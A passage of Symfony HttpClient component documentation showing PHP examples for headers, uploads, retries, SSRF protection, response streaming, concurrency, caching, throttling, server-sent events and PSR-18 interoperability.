        // this header is added to all requests made by this client
        $client = HttpClient::create([
            'headers' => [
                'User-Agent' => 'My Fancy App',
            ],
        ]);

You can also set new headers or override the default ones for specific requests::

    // this header is only included in this request and overrides the value
    // of the same header if defined globally by the HTTP client
    $response = $client->request('POST', 'https://...', [
        'headers' => [
            'Content-Type' => 'text/plain',
        ],
    ]);

Uploading Data
~~~~~~~~~~~~~~

This component provides several methods for uploading data using the ``body``
option. You can use regular strings, closures, iterables and resources and they'll be
processed automatically when making the requests::

    $response = $client->request('POST', 'https://...', [
        // defining data using a regular string
        'body' => 'raw data',

        // defining data using an array of parameters
        'body' => ['parameter1' => 'value1', '...'],

        // using a closure to generate the uploaded data
        'body' => function (int $size): string {
            // ...
        },

        // using a resource to get the data from it
        'body' => fopen('/path/to/file', 'r'),
    ]);

When uploading data with the ``POST`` method, if you don't define the
``Content-Type`` HTTP header explicitly, Symfony assumes that you're uploading
form data and adds the required
``'Content-Type: application/x-www-form-urlencoded'`` header for you.

When the ``body`` option is set as a closure, it will be called several times until
it returns the empty string, which signals the end of the body. Each time, the
closure should return a string smaller than the amount requested as argument.

A generator or any ``Traversable`` can also be used instead of a closure.

.. tip::

    When uploading JSON payloads, use the ``json`` option instead of ``body``. The
    given content will be JSON-encoded automatically and the request will add the
    ``Content-Type: application/json`` automatically too::

        $response = $client->request('POST', 'https://...', [
            'json' => ['param1' => 'value1', '...'],
        ]);

        $decodedPayload = $response->toArray();

To submit a form with file uploads, pass the file handle to the ``body`` option::

    $fileHandle = fopen('/path/to/the/file', 'r');
    $client->request('POST', 'https://...', ['body' => ['the_file' => $fileHandle]]);

By default, this code will populate the filename and content-type with the data
of the opened file, but you can configure both with the PHP streaming configuration::

    stream_context_set_option($fileHandle, 'http', 'filename', 'the-name.txt');
    stream_context_set_option($fileHandle, 'http', 'content_type', 'my/content-type');

.. tip::

    When using multidimensional arrays the :class:`Symfony\\Component\\Mime\\Part\\Multipart\\FormDataPart`
    class automatically appends ``[key]`` to the name of the field::

        $formData = new FormDataPart([
            'array_field' => [
                'some value',
                'other value',
            ],
        ]);

        $formData->getParts(); // Returns two instances of TextPart
                               // with the names "array_field[0]" and "array_field[1]"

    This behavior can be bypassed by using the following array structure::

        $formData = new FormDataPart([
            ['array_field' => 'some value'],
            ['array_field' => 'other value'],
        ]);

        $formData->getParts(); // Returns two instances of TextPart both
                               // with the name "array_field"

By default, HttpClient streams the body contents when uploading them. This might
not work with all servers, resulting in HTTP status code 411 ("Length Required")
because there is no ``Content-Length`` header. The solution is to turn the body
into a string with the following method (which will increase memory consumption
when the streams are large)::

    $client->request('POST', 'https://...', [
        // ...
        'body' => $formData->bodyToString(),
    ]);

If you need to add a custom HTTP header to the upload, you can do::

    $headers = $formData->getPreparedHeaders()->toArray();
    $headers[] = 'X-Foo: bar';

Cookies
~~~~~~~

The HTTP client provided by this component is stateless but handling cookies
requires a stateful storage (because responses can update cookies and they must
be used for subsequent requests). That's why this component doesn't handle
cookies automatically.

You can either :ref:`send cookies with the BrowserKit component <component-browserkit-sending-cookies>`,
which integrates seamlessly with the HttpClient component, or manually setting
the ``Cookie`` HTTP header as follows::

    use Symfony\Component\HttpClient\HttpClient;
    use Symfony\Component\HttpFoundation\Cookie;

    $client = HttpClient::create([
        'headers' => [
            'Cookie' => new Cookie('flavor', 'chocolate', strtotime('+1 day')),

            // you can also pass the cookie contents as a string
            'Cookie' => 'flavor=chocolate; expires=Sat, 11 Feb 2023 12:18:13 GMT; Max-Age=86400; path=/'
        ],
    ]);

Redirects
~~~~~~~~~

By default, the HTTP client follows redirects, up to a maximum of 20, when
making a request. Use the ``max_redirects`` setting to configure this behavior
(if the number of redirects is higher than the configured value, you'll get a
:class:`Symfony\\Component\\HttpClient\\Exception\\RedirectionException`)::

    $response = $client->request('GET', 'https://...', [
        // 0 means to not follow any redirect
        'max_redirects' => 0,
    ]);

Retry Failed Requests
~~~~~~~~~~~~~~~~~~~~~

Sometimes, requests fail because of network issues or temporary server errors.
Symfony's HttpClient allows to retry failed requests automatically using the
:ref:`retry_failed option <reference-http-client-retry-failed>`.

By default, failed requests are retried up to 3 times, with an exponential delay
between retries (first retry = 1 second; third retry: 4 seconds) and only for
the following HTTP status codes: ``423``, ``425``, ``429``, ``502`` and ``503``
when using any HTTP method and ``500``, ``504``, ``507`` and ``510`` when using
an HTTP `idempotent method`_. Use the ``max_retries`` setting to configure the
amount of times a request is retried.

Check out the full list of configurable :ref:`retry_failed options <reference-http-client-retry-failed>`
to learn how to tweak each of them to fit your application needs.

When using the HttpClient outside of a Symfony application, use the
:class:`Symfony\\Component\\HttpClient\\RetryableHttpClient` class to wrap your
original HTTP client::

    use Symfony\Component\HttpClient\RetryableHttpClient;

    $client = new RetryableHttpClient(HttpClient::create());

The :class:`Symfony\\Component\\HttpClient\\RetryableHttpClient` uses a
:class:`Symfony\\Component\\HttpClient\\Retry\\RetryStrategyInterface` to
decide if the request should be retried, and to define the waiting time between
each retry.

Retry Over Several Base URIs
............................

The ``RetryableHttpClient`` can be configured to use multiple base URIs. This
feature provides increased flexibility and reliability for making HTTP
requests. Pass an array of base URIs as option ``base_uri`` when making a
request::

    $response = $client->request('GET', 'some-page', [
        'base_uri' => [
            // first request will use this base URI
            'https://example.com/a/',
            // if first request fails, the following base URI will be used
            'https://example.com/b/',
        ],
    ]);

When the number of retries is higher than the number of base URIs, the
last base URI will be used for the remaining retries.

If you want to shuffle the order of base URIs for each retry attempt, nest the
base URIs you want to shuffle in an additional array::

    $response = $client->request('GET', 'some-page', [
        'base_uri' => [
            [
                // a single random URI from this array will be used for the first request
                'https://example.com/a/',
                'https://example.com/b/',
            ],
            // non-nested base URIs are used in order
            'https://example.com/c/',
        ],
    ]);

This feature allows for a more randomized approach to handling retries,
reducing the likelihood of repeatedly hitting the same failed base URI.

By using a nested array for the base URI, you can use this feature
to distribute the load among many nodes in a cluster of servers.

You can also configure the array of base URIs using the ``withOptions()``
method::

    $client = $client->withOptions(['base_uri' => [
        'https://example.com/a/',
        'https://example.com/b/',
    ]]);

HTTP Proxies
~~~~~~~~~~~~

By default, this component honors the standard environment variables that your
Operating System defines to direct the HTTP traffic through your local proxy.
This means there is usually nothing to configure to have the client work with
proxies, provided these env vars are properly configured.

You can still set or override these settings using the ``proxy`` and ``no_proxy``
options:

* ``proxy`` should be set to the ``http://...`` URL of the proxy to get through

* ``no_proxy`` disables the proxy for a comma-separated list of hosts that do not
  require it to get reached.

Progress Callback
~~~~~~~~~~~~~~~~~

By providing a callable to the ``on_progress`` option, one can track
uploads/downloads as they complete. This callback is guaranteed to be called on
DNS resolution, on arrival of headers and on completion; additionally it is
called when new data is uploaded or downloaded and at least once per second::

    $response = $client->request('GET', 'https://...', [
        'on_progress' => function (int $dlNow, int $dlSize, array $info): void {
            // $dlNow is the number of bytes downloaded so far
            // $dlSize is the total size to be downloaded or -1 if it is unknown
            // $info is what $response->getInfo() would return at this very time
        },
    ]);

Any exceptions thrown from the callback will be wrapped in an instance of
:class:`Symfony\\Contracts\\HttpClient\\Exception\\TransportExceptionInterface`
and will abort the request.

HTTPS Certificates
~~~~~~~~~~~~~~~~~~

HttpClient uses the system's certificate store to validate SSL certificates
(while browsers use their own stores). When using self-signed certificates
during development, it's recommended to create your own certificate authority
(CA) and add it to your system's store.

Alternatively, you can also disable ``verify_host`` and ``verify_peer`` (see
:ref:`http_client config reference <reference-http-client>`), but this is not
recommended in production.

SSRF (Server-side request forgery) Handling
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

`SSRF`_ allows an attacker to induce the backend application to make HTTP
requests to an arbitrary domain. These attacks can also target the internal
hosts and IPs of the attacked server.

If you use an :class:`Symfony\\Component\\HttpClient\\HttpClient` together
with user-provided URIs, it is probably a good idea to decorate it with a
:class:`Symfony\\Component\\HttpClient\\NoPrivateNetworkHttpClient`. This will
ensure local networks are made inaccessible to the HTTP client::

    use Symfony\Component\HttpClient\HttpClient;
    use Symfony\Component\HttpClient\NoPrivateNetworkHttpClient;

    $client = new NoPrivateNetworkHttpClient(HttpClient::create());
    // nothing changes when requesting public networks
    $client->request('GET', 'https://example.com/');

    // however, all requests to private networks are now blocked by default
    $client->request('GET', 'http://localhost/');

    // the second optional argument defines the networks to block
    // in this example, requests from 104.26.14.0 to 104.26.15.255 will result in an exception
    // but all the other requests, including other internal networks, will be allowed
    $client = new NoPrivateNetworkHttpClient(HttpClient::create(), ['104.26.14.0/23']);

Profiling
~~~~~~~~~

When you are using the :class:`Symfony\\Component\\HttpClient\\TraceableHttpClient`,
responses content will be kept in memory and may exhaust it.

You can disable this behavior by setting the ``extra.trace_content`` option to ``false``
in your requests::

    $response = $client->request('GET', 'https://...', [
        'extra' => ['trace_content' => false],
    ]);

This setting won’t affect other clients.

Using URI Templates
~~~~~~~~~~~~~~~~~~~

The :class:`Symfony\\Component\\HttpClient\\UriTemplateHttpClient` provides
a client that eases the use of URI templates, as described in the `RFC 6570`_::

    $client = new UriTemplateHttpClient();

    // this will make a request to the URL http://example.org/users?page=1
    $client->request('GET', 'http://example.org/{resource}{?page}', [
        'vars' => [
            'resource' => 'users',
            'page' => 1,
        ],
    ]);

Before using URI templates in your applications, you must install a third-party
package that expands those URI templates to turn them into URLs:

.. code-block:: terminal

    $ composer require league/uri

    # Symfony also supports the following URI template packages:
    # composer require guzzlehttp/uri-template
    # composer require rize/uri-template

When using this client in the framework context, all existing HTTP clients
are decorated by the :class:`Symfony\\Component\\HttpClient\\UriTemplateHttpClient`.
This means that URI template feature is enabled by default for all HTTP clients
you may use in your application.

You can configure variables that will be replaced globally in all URI templates
of your application:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/framework.yaml
        framework:
            http_client:
                default_options:
                    vars:
                        - secret: 'secret-token'

    .. code-block:: xml

        <!-- config/packages/framework.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <framework:config>
                <framework:http-client>
                    <framework:default-options>
                        <framework:vars name="secret">secret-token</framework:vars>
                    </framework:default-options>
                </framework:http-client>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/framework.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework) {
            $framework->httpClient()
                ->defaultOptions()
                    ->vars(['secret' => 'secret-token'])
            ;
        };

If you want to define your own logic to handle variables of URI templates, you
can do so by redefining the ``http_client.uri_template_expander`` alias. Your
service must be invokable.

Performance
-----------

The component is built for maximum HTTP performance. By design, it is compatible
with HTTP/2 and with doing concurrent asynchronous streamed and multiplexed
requests/responses. Even when doing regular synchronous calls, this design
allows keeping connections to remote hosts open between requests, improving
performance by saving repetitive DNS resolution, SSL negotiation, etc.
To leverage all these design benefits, the cURL extension is needed.

Enabling cURL Support
~~~~~~~~~~~~~~~~~~~~~

This component can make HTTP requests using native PHP streams and the
``amphp/http-client`` and cURL libraries. Although they are interchangeable and
provide the same features, including concurrent requests, HTTP/2 is only supported
when using cURL or ``amphp/http-client``.

.. note::

    To use the :class:`Symfony\\Component\\HttpClient\\AmpHttpClient`, the
    `amphp/http-client`_ package must be installed.

The :method:`Symfony\\Component\\HttpClient\\HttpClient::create` method
selects the cURL transport if the `cURL PHP extension`_ is enabled. It falls
back to ``AmpHttpClient`` if cURL couldn't be found or is too old. Finally, if
``AmpHttpClient`` is not available, it falls back to PHP streams.
If you prefer to select the transport explicitly, use the following classes
to create the client::

    use Symfony\Component\HttpClient\AmpHttpClient;
    use Symfony\Component\HttpClient\CurlHttpClient;
    use Symfony\Component\HttpClient\NativeHttpClient;

    // uses native PHP streams
    $client = new NativeHttpClient();

    // uses the cURL PHP extension
    $client = new CurlHttpClient();

    // uses the client from the `amphp/http-client` package
    $client = new AmpHttpClient();

When using this component in a full-stack Symfony application, this behavior is
not configurable and cURL will be used automatically if the cURL PHP extension
is installed and enabled, and will fall back as explained above.

Configuring CurlHttpClient Options
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

PHP allows to configure lots of `cURL options`_ via the :phpfunction:`curl_setopt`
function. In order to make the component more portable when not using cURL, the
:class:`Symfony\\Component\\HttpClient\\CurlHttpClient` only uses some of those
options (and they are ignored in the rest of clients).

Add an ``extra.curl`` option in your configuration to pass those extra options::

    use Symfony\Component\HttpClient\CurlHttpClient;

    $client = new CurlHttpClient();

    $client->request('POST', 'https://...', [
        // ...
        'extra' => [
            'curl' => [
                CURLOPT_IPRESOLVE => CURL_IPRESOLVE_V6,
            ],
        ],
    ]);

.. note::

    Some cURL options are impossible to override (e.g. because of thread safety)
    and you'll get an exception when trying to override them.

HTTP Compression
~~~~~~~~~~~~~~~~

The HTTP header ``Accept-Encoding: gzip`` is added automatically if:

* using cURL client: cURL was compiled with ZLib support (see ``php --ri curl``)
* using the native HTTP client: `Zlib PHP extension`_ is installed

If the server does respond with a gzipped response, it's decoded transparently.
To disable HTTP compression, send an ``Accept-Encoding: identity`` HTTP header.

Chunked transfer encoding is enabled automatically if both your PHP runtime and
the remote server support it.

.. caution::

    If you set ``Accept-Encoding`` to e.g. ``gzip``, you will need to handle the
    decompression yourself.

HTTP/2 Support
~~~~~~~~~~~~~~

When requesting an ``https`` URL, HTTP/2 is enabled by default if one of the
following tools is installed:

* The `libcurl`_ package version 7.36 or higher, used with PHP >= 7.2.17 / 7.3.4;
* The `amphp/http-client`_ Packagist package version 4.2 or higher.

To force HTTP/2 for ``http`` URLs, you need to enable it explicitly via the
``http_version`` option:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/framework.yaml
        framework:
            http_client:
                default_options:
                    http_version: '2.0'

    .. code-block:: xml

        <!-- config/packages/framework.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <framework:config>
                <framework:http-client>
                    <framework:default-options http-version="2.0"/>
                </framework:http-client>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/framework.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            $framework->httpClient()
                ->defaultOptions()
                    ->httpVersion('2.0')
            ;
        };

    .. code-block:: php-standalone

        $client = HttpClient::create(['http_version' => '2.0']);

Support for HTTP/2 PUSH works out of the box when using a compatible client:
pushed responses are put into a temporary cache and are used when a
subsequent request is triggered for the corresponding URLs.

Processing Responses
--------------------

The response returned by all HTTP clients is an object of type
:class:`Symfony\\Contracts\\HttpClient\\ResponseInterface` which provides the
following methods::

    $response = $client->request('GET', 'https://...');

    // gets the HTTP status code of the response
    $statusCode = $response->getStatusCode();

    // gets the HTTP headers as string[][] with the header names lower-cased
    $headers = $response->getHeaders();

    // gets the response body as a string
    $content = $response->getContent();

    // casts the response JSON content to a PHP array
    $content = $response->toArray();

    // casts the response content to a PHP stream resource
    $content = $response->toStream();

    // cancels the request/response
    $response->cancel();

    // returns info coming from the transport layer, such as "response_headers",
    // "redirect_count", "start_time", "redirect_url", etc.
    $httpInfo = $response->getInfo();

    // you can get individual info too
    $startTime = $response->getInfo('start_time');
    // e.g. this returns the final response URL (resolving redirections if needed)
    $url = $response->getInfo('url');

    // returns detailed logs about the requests and responses of the HTTP transaction
    $httpLogs = $response->getInfo('debug');

    // the special "pause_handler" info item is a callable that allows to delay the request
    // for a given number of seconds; this allows you to delay retries, throttle streams, etc.
    $response->getInfo('pause_handler')(2);

.. note::

    ``$response->toStream()`` is part of :class:`Symfony\\Component\\HttpClient\\Response\\StreamableInterface`.

.. note::

    ``$response->getInfo()`` is non-blocking: it returns *live* information
    about the response. Some of them might not be known yet (e.g. ``http_code``)
    when you'll call it.

.. _http-client-streaming-responses:

Streaming Responses
~~~~~~~~~~~~~~~~~~~

Call the :method:`Symfony\\Contracts\\HttpClient\\HttpClientInterface::stream`
method to get *chunks* of the response sequentially instead of waiting for the
entire response::

    $url = 'https://releases.ubuntu.com/18.04.1/ubuntu-18.04.1-desktop-amd64.iso';
    $response = $client->request('GET', $url);

    // Responses are lazy: this code is executed as soon as headers are received
    if (200 !== $response->getStatusCode()) {
        throw new \Exception('...');
    }

    // get the response content in chunks and save them in a file
    // response chunks implement Symfony\Contracts\HttpClient\ChunkInterface
    $fileHandler = fopen('/ubuntu.iso', 'w');
    foreach ($client->stream($response) as $chunk) {
        fwrite($fileHandler, $chunk->getContent());
    }

.. note::

    By default, ``text/*``, JSON and XML response bodies are buffered in a local
    ``php://temp`` stream. You can control this behavior by using the ``buffer``
    option: set it to ``true``/``false`` to enable/disable buffering, or to a
    closure that should return the same based on the response headers it receives
    as an argument.

Canceling Responses
~~~~~~~~~~~~~~~~~~~

To abort a request (e.g. because it didn't complete in due time, or you want to
fetch only the first bytes of the response, etc.), you can either use the
:method:`Symfony\\Contracts\\HttpClient\\ResponseInterface::cancel`::

    $response->cancel();

Or throw an exception from a progress callback::

    $response = $client->request('GET', 'https://...', [
        'on_progress' => function (int $dlNow, int $dlSize, array $info): void {
            // ...

            throw new \MyException();
        },
    ]);

The exception will be wrapped in an instance of
:class:`Symfony\\Contracts\\HttpClient\\Exception\\TransportExceptionInterface`
and will abort the request.

In case the response was canceled using ``$response->cancel()``,
``$response->getInfo('canceled')`` will return ``true``.

Handling Exceptions
~~~~~~~~~~~~~~~~~~~

There are three types of exceptions, all of which implement the
:class:`Symfony\\Contracts\\HttpClient\\Exception\\ExceptionInterface`:

* Exceptions implementing the :class:`Symfony\\Contracts\\HttpClient\\Exception\\HttpExceptionInterface`
  are thrown when your code does not handle the status codes in the 300-599 range.

* Exceptions implementing the :class:`Symfony\\Contracts\\HttpClient\\Exception\\TransportExceptionInterface`
  are thrown when a lower level issue occurs.

* Exceptions implementing the :class:`Symfony\\Contracts\\HttpClient\\Exception\\DecodingExceptionInterface`
  are thrown when a content-type cannot be decoded to the expected representation.

When the HTTP status code of the response is in the 300-599 range (i.e. 3xx,
4xx or 5xx), the ``getHeaders()``, ``getContent()`` and ``toArray()`` methods
throw an appropriate exception, all of which implement the
:class:`Symfony\\Contracts\\HttpClient\\Exception\\HttpExceptionInterface`.

To opt-out from this exception and deal with 300-599 status codes on your own,
pass ``false`` as the optional argument to every call of those methods,
e.g. ``$response->getHeaders(false);``.

If you do not call any of these 3 methods at all, the exception will still be thrown
when the ``$response`` object is destructed.

Calling ``$response->getStatusCode()`` is enough to disable this behavior
(but then don't miss checking the status code yourself).

While responses are lazy, their destructor will always wait for headers to come
back. This means that the following request *will* complete; and if e.g. a 404
is returned, an exception will be thrown::

    // because the returned value is not assigned to a variable, the destructor
    // of the returned response will be called immediately and will throw if the
    // status code is in the 300-599 range
    $client->request('POST', 'https://...');

This in turn means that unassigned responses will fallback to synchronous requests.
If you want to make these requests concurrent, you can store their corresponding
responses in an array::

    $responses[] = $client->request('POST', 'https://.../path1');
    $responses[] = $client->request('POST', 'https://.../path2');
    // ...

    // This line will trigger the destructor of all responses stored in the array;
    // they will complete concurrently and an exception will be thrown in case a
    // status code in the 300-599 range is returned
    unset($responses);

This behavior provided at destruction-time is part of the fail-safe design of the
component. No errors will be unnoticed: if you don't write the code to handle
errors, exceptions will notify you when needed. On the other hand, if you write
the error-handling code (by calling ``$response->getStatusCode()``), you will
opt-out from these fallback mechanisms as the destructor won't have anything
remaining to do.

Concurrent Requests
-------------------

Thanks to responses being lazy, requests are always managed concurrently.
On a fast enough network, the following code makes 379 requests in less than
half a second when cURL is used::

    $responses = [];
    for ($i = 0; $i < 379; ++$i) {
        $uri = "https://http2.akamai.com/demo/tile-$i.png";
        $responses[] = $client->request('GET', $uri);
    }

    foreach ($responses as $response) {
        $content = $response->getContent();
        // ...
    }

As you can read in the first "for" loop, requests are issued but are not consumed
yet. That's the trick when concurrency is desired: requests should be sent
first and be read later on. This will allow the client to monitor all pending
requests while your code waits for a specific one, as done in each iteration of
the above "foreach" loop.

.. note::

    The maximum number of concurrent requests that you can perform depends on
    the resources of your machine (e.g. your operating system may limit the
    number of simultaneous reads of the file that stores the certificates
    file). Make your requests in batches to avoid these issues.

Multiplexing Responses
~~~~~~~~~~~~~~~~~~~~~~

If you look again at the snippet above, responses are read in requests' order.
But maybe the 2nd response came back before the 1st? Fully asynchronous operations
require being able to deal with the responses in whatever order they come back.

In order to do so, the
:method:`Symfony\\Contracts\\HttpClient\\HttpClientInterface::stream`
accepts a list of responses to monitor. As mentioned
:ref:`previously <http-client-streaming-responses>`, this method yields response
chunks as they arrive from the network. By replacing the "foreach" in the
snippet with this one, the code becomes fully async::

    foreach ($client->stream($responses) as $response => $chunk) {
        if ($chunk->isFirst()) {
            // headers of $response just arrived
            // $response->getHeaders() is now a non-blocking call
        } elseif ($chunk->isLast()) {
            // the full content of $response just completed
            // $response->getContent() is now a non-blocking call
        } else {
            // $chunk->getContent() will return a piece
            // of the response body that just arrived
        }
    }

.. tip::

    Use the ``user_data`` option combined with ``$response->getInfo('user_data')``
    to track the identity of the responses in your foreach loops.

Dealing with Network Timeouts
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

This component allows dealing with both request and response timeouts.

A timeout can happen when e.g. DNS resolution takes too much time, when the TCP
connection cannot be opened in the given time budget, or when the response
content pauses for too long. This can be configured with the ``timeout`` request
option::

    // A TransportExceptionInterface will be issued if nothing
    // happens for 2.5 seconds when accessing from the $response
    $response = $client->request('GET', 'https://...', ['timeout' => 2.5]);

The ``default_socket_timeout`` PHP ini setting is used if the option is not set.

The option can be overridden by using the 2nd argument of the ``stream()`` method.
This allows monitoring several responses at once and applying the timeout to all
of them in a group. If all responses become inactive for the given duration, the
method will yield a special chunk whose ``isTimeout()`` will return ``true``::

    foreach ($client->stream($responses, 1.5) as $response => $chunk) {
        if ($chunk->isTimeout()) {
            // $response stale for more than 1.5 seconds
        }
    }

A timeout is not necessarily an error: you can decide to stream again the
response and get remaining contents that might come back in a new timeout, etc.

.. tip::

    Passing ``0`` as timeout allows monitoring responses in a non-blocking way.

.. note::

    Timeouts control how long one is willing to wait *while the HTTP transaction
    is idle*. Big responses can last as long as needed to complete, provided they
    remain active during the transfer and never pause for longer than specified.

    Use the ``max_duration`` option to limit the time a full request/response can last.

.. _http-client_network-errors:

Dealing with Network Errors
~~~~~~~~~~~~~~~~~~~~~~~~~~~

Network errors (broken pipe, failed DNS resolution, etc.) are thrown as instances
of :class:`Symfony\\Contracts\\HttpClient\\Exception\\TransportExceptionInterface`.

First of all, you don't *have* to deal with them: letting errors bubble to your
generic exception-handling stack might be really fine in most use cases.

If you want to handle them, here is what you need to know:

To catch errors, you need to wrap calls to ``$client->request()`` but also calls
to any methods of the returned responses. This is because responses are lazy, so
that network errors can happen when calling e.g. ``getStatusCode()`` too::

    use Symfony\Contracts\HttpClient\Exception\TransportExceptionInterface;

    // ...
    try {
        // both lines can potentially throw
        $response = $client->request(/* ... */);
        $headers = $response->getHeaders();
        // ...
    } catch (TransportExceptionInterface $e) {
        // ...
    }

.. note::

    Because ``$response->getInfo()`` is non-blocking, it shouldn't throw by design.

When multiplexing responses, you can deal with errors for individual streams by
catching :class:`Symfony\\Contracts\\HttpClient\\Exception\\TransportExceptionInterface`
in the foreach loop::

    foreach ($client->stream($responses) as $response => $chunk) {
        try {
            if ($chunk->isTimeout()) {
                // ... decide what to do when a timeout occurs
                // if you want to stop a response that timed out, don't miss
                // calling $response->cancel() or the destructor of the response
                // will try to complete it one more time
            } elseif ($chunk->isFirst()) {
                // if you want to check the status code, you must do it when the
                // first chunk arrived, using $response->getStatusCode();
                // not doing so might trigger an HttpExceptionInterface
            } elseif ($chunk->isLast()) {
                // ... do something with $response
            }
        } catch (TransportExceptionInterface $e) {
            // ...
        }
    }

Caching Requests and Responses
------------------------------

This component provides a :class:`Symfony\\Component\\HttpClient\\CachingHttpClient`
decorator that allows caching responses and serving them from the local storage
for next requests. The implementation leverages the
:class:`Symfony\\Component\\HttpKernel\\HttpCache\\HttpCache` class under the hood
so that the :doc:`HttpKernel component </components/http_kernel>` needs to be
installed in your application::

    use Symfony\Component\HttpClient\CachingHttpClient;
    use Symfony\Component\HttpClient\HttpClient;
    use Symfony\Component\HttpKernel\HttpCache\Store;

    $store = new Store('/path/to/cache/storage/');
    $client = HttpClient::create();
    $client = new CachingHttpClient($client, $store);

    // this won't hit the network if the resource is already in the cache
    $response = $client->request('GET', 'https://example.com/cacheable-resource');

:class:`Symfony\\Component\\HttpClient\\CachingHttpClient` accepts a third argument
to set the options of the :class:`Symfony\\Component\\HttpKernel\\HttpCache\\HttpCache`.

Limit the Number of Requests
----------------------------

This component provides a :class:`Symfony\\Component\\HttpClient\\ThrottlingHttpClient`
decorator that allows to limit the number of requests within a certain period.

The implementation leverages the
:class:`Symfony\\Component\\RateLimiter\\LimiterInterface` class under the hood
so the :doc:`Rate Limiter component </rate_limiter>` needs to be
installed in your application::

    use Symfony\Component\HttpClient\HttpClient;
    use Symfony\Component\HttpClient\ThrottlingHttpClient;
    use Symfony\Component\RateLimiter\LimiterInterface;

    $rateLimiter = ...; // $rateLimiter is an instance of Symfony\Component\RateLimiter\LimiterInterface
    $client = HttpClient::create();
    $client = new ThrottlingHttpClient($client, $rateLimiter);

    $requests = [];
    for ($i = 0; $i < 100; $i++) {
        $requests[] = $client->request('GET', 'https://example.com');
    }

    foreach ($requests as $request) {
        // Depending on rate limiting policy, calls will be delayed
        $output->writeln($request->getContent());
    }

.. versionadded:: 7.1

    The :class:`Symfony\\Component\\HttpClient\\ThrottlingHttpClient` was
    introduced in Symfony 7.1.

Consuming Server-Sent Events
----------------------------

`Server-sent events`_ is an Internet standard used to push data to web pages.
Its JavaScript API is built around an `EventSource`_ object, which listens to
the events sent from some URL. The events are a stream of data (served with the
``text/event-stream`` MIME type) with the following format:

.. code-block:: text

    data: This is the first message.

    data: This is the second message, it
    data: has two lines.

    data: This is the third message.

Symfony's HTTP client provides an EventSource implementation to consume these
server-sent events. Use the :class:`Symfony\\Component\\HttpClient\\EventSourceHttpClient`
to wrap your HTTP client, open a connection to a server that responds with a
``text/event-stream`` content type and consume the stream as follows::

    use Symfony\Component\HttpClient\Chunk\ServerSentEvent;
    use Symfony\Component\HttpClient\EventSourceHttpClient;

    // the second optional argument is the reconnection time in seconds (default = 10)
    $client = new EventSourceHttpClient($client, 10);
    $source = $client->connect('https://localhost:8080/events');
    while ($source) {
        foreach ($client->stream($source, 2) as $r => $chunk) {
            if ($chunk->isTimeout()) {
                // ...
                continue;
            }

            if ($chunk->isLast()) {
                // ...

                return;
            }

            // this is a special ServerSentEvent chunk holding the pushed message
            if ($chunk instanceof ServerSentEvent) {
                // do something with the server event ...
            }
        }
    }

.. tip::

    If you know that the content of the ``ServerSentEvent`` is in the JSON format, you can
    use the :method:`Symfony\\Component\\HttpClient\\Chunk\\ServerSentEvent::getArrayData`
    method to directly get the decoded JSON as array.

Interoperability
----------------

The component is interoperable with four different abstractions for HTTP
clients: `Symfony Contracts`_, `PSR-18`_, `HTTPlug`_ v1/v2 and native PHP streams.
If your application uses libraries that need any of them, the component is compatible
with all of them. They also benefit from :ref:`autowiring aliases <service-autowiring-alias>`
when the :doc:`framework bundle </reference/configuration/framework>` is used.

If you are writing or maintaining a library that makes HTTP requests, you can
decouple it from any specific HTTP client implementations by coding against
either Symfony Contracts (recommended), PSR-18 or HTTPlug v2.

Symfony Contracts
~~~~~~~~~~~~~~~~~

The interfaces found in the ``symfony/http-client-contracts`` package define
the primary abstractions implemented by the component. Its entry point is the
:class:`Symfony\\Contracts\\HttpClient\\HttpClientInterface`. That's the
interface you need to code against when a client is needed::

    use Symfony\Contracts\HttpClient\HttpClientInterface;

    class MyApiLayer
    {
        public function __construct(
            private HttpClientInterface $client,
        ) {
        }

        // [...]
    }

All request options mentioned above (e.g. timeout management) are also defined
in the wordings of the interface, so that any compliant implementations (like
this component) is guaranteed to provide them. That's a major difference with
the other abstractions, which provide none related to the transport itself.

Another major feature covered by the Symfony Contracts is async/multiplexing,
as described in the previous sections.

PSR-18 and PSR-17
~~~~~~~~~~~~~~~~~

This component implements the `PSR-18`_ (HTTP Client) specifications via the
:class:`Symfony\\Component\\HttpClient\\Psr18Client` class, which is an adapter
to turn a Symfony :class:`Symfony\\Contracts\\HttpClient\\HttpClientInterface`
into a PSR-18 ``ClientInterface``. This class also implements the relevant
methods of `PSR-17`_ to ease creating request objects.

To use it, you need the ``psr/http-client`` package and a `PSR-17`_ implementation:

.. code-block:: terminal

    # installs the PSR-18 ClientInterface
    $ composer require psr/http-client

    # installs an efficient implementation of response and stream factories
    # with autowiring aliases provided by Symfony Flex
    $ composer require nyholm/psr7

    # alternatively, install the php-http/discovery package to auto-discover
    # any already installed implementations from common vendors:
    # composer require php-http/discovery

Now you can make HTTP requests with the PSR-18 client as follows:

.. configuration-block::

    .. code-block:: php-symfony

        use Psr\Http\Client\ClientInterface;

        class Symfony
        {
            public function __construct(
                private ClientInterface $client,
            ) {
            }

            public function getAvailableVersions(): array
            {
                $request = $this->client->createRequest('GET', 'https://symfony.com/versions.json');
                $response = $this->client->sendRequest($request);

                return json_decode($response->getBody()->getContents(), true);
            }
        }

    .. code-block:: php-standalone

        use Symfony\Component\HttpClient\Psr18Client;

